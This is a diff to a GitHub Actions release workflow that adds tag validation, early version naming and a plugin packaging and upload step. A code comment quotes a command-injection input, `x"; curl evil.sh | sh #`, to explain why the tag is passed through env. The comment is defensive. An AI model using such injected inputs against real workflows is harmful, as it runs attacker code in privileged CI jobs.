@@ -66,6 +66,11 @@ jobs:
           ref: ${{ github.event.inputs.tag && format('refs/tags/{0}', github.event.inputs.tag) || github.sha }}
           submodules: recursive
 
+      # INPUT_TAG goes through env, never interpolated into the script body.
+      # `${{ github.event.inputs.tag }}` written inline is substituted before bash
+      # sees it, so a dispatch input like `x"; curl evil.sh | sh #` executes — in
+      # a job holding contents:write. Via env it is only ever a shell variable's
+      # value.
       - name: Check what is being built
         shell: bash
         env:
@@ -77,6 +82,9 @@ jobs:
             echo "a manual release needs a tag; use validate_only to build without one"; exit 1
           fi
           if [ -n "$INPUT_TAG" ]; then
+            # The plugin archive's name drops the "v" the app archives keep,
+            # so a published release never holds two files of one name.
+            case "$INPUT_TAG" in v*) ;; *) echo "a release tag starts with v: $INPUT_TAG"; exit 1 ;; esac
             [ "$(git rev-parse HEAD)" = "$(git rev-parse "refs/tags/$INPUT_TAG^{commit}")" ] \
               || { echo "the checkout is not tag $INPUT_TAG"; exit 1; }
           else
@@ -84,6 +92,13 @@ jobs:
               || { echo "the checkout is not the run's commit $GITHUB_SHA"; exit 1; }
           fi
           echo "building $(git rev-parse HEAD)"
+          # The name the packages carry. Explicit input wins: on
+          # workflow_dispatch GITHUB_REF_NAME is the *branch* ("development"),
+          # not a tag, so preferring it would name every dispatched artifact
+          # after the branch. A validate-only run of a branch such as
+          # feature/x names files after it.
+          VERSION="${INPUT_TAG:-$GITHUB_REF_NAME}"
+          echo "VERSION=${VERSION//\//-}" >> "$GITHUB_ENV"
 
       - name: Install SCons
         run: pipx install scons
@@ -288,23 +303,36 @@ jobs:
           } > "$OUT"
           echo "wrote $OUT ($(wc -l < "$OUT") lines)"
 
-      # INPUT_TAG goes through env, never interpolated into the script body.
-      # `${{ github.event.inputs.tag }}` written inline is substituted before bash
-      # sees it, so a dispatch input like `x"; curl evil.sh | sh #` executes — in
-      # a job holding contents:write and the signing key. Via env it is only ever
-      # a shell variable's value.
-      - name: Package
+      # The plugin a host (Minerva) installs: this target's whole release
+      # export with the panel beside it and the notices its binaries need,
+      # as <id>-<version>-<target>.tar.gz, then checked as a host receives
+      # it. Staged before Package adds the app's other files to the export
+      # directories.
+      - name: Package and check the plugin
         shell: bash
-        env:
-          INPUT_TAG: ${{ github.event.inputs.tag }}
+        timeout-minutes: 30
         run: |
           set -euo pipefail
-          # Explicit input wins. On workflow_dispatch GITHUB_REF_NAME is the
-          # *branch* ("development"), not a tag, so preferring it would name
-          # every dispatched artifact after the branch.
-          VERSION="${INPUT_TAG:-$GITHUB_REF_NAME}"
-          # A validate-only run of a branch such as feature/x names files after it.
-          VERSION="${VERSION//\//-}"
+          PLUGIN_VERSION="${VERSION#v}"
+          case "${{ matrix.platform }}" in
+            macos) EXPORT=build/macos/Docket.app ;;
+            *)     EXPORT="build/${{ matrix.platform }}" ;;
+          esac
+          PYTHON="$(command -v python3 || command -v python)"
+          "$PYTHON" scripts/build/package_plugin.py --out build/plugin --version "$PLUGIN_VERSION" \
+            --target "${{ matrix.platform }}" --export-root "$EXPORT" \
+            --notice LICENSE --notice THIRD-PARTY-LICENSES.txt --notice docs/sbom.cdx.json
+          mkdir -p dist-plugin
+          ARCHIVE="dist-plugin/docket-${PLUGIN_VERSION}-${{ matrix.platform }}-${{ matrix.arch }}.tar.gz"
+          # No AppleDouble files for extended attributes: they would be
+          # files the package's SHA256SUMS does not list.
+          COPYFILE_DISABLE=1 tar -czf "$ARCHIVE" -C build/plugin .
+          "$PYTHON" scripts/build/check_plugin_package.py "$ARCHIVE" "$PLUGIN_VERSION"
+
+      - name: Package
+        shell: bash
+        run: |
+          set -euo pipefail
           mkdir -p dist
 
           case "${{ matrix.platform }}" in
@@ -346,6 +374,13 @@ jobs:
         with:
           name: docket-${{ matrix.platform }}
           path: dist/*
+          if-no-files-found: error
+
+      - name: Upload plugin artifact
+        uses: actions/upload-artifact@v7
+        with:
+          name: docket-plugin-${{ matrix.platform }}
+          path: dist-plugin/*
           if-no-files-found: error
 
   publish:
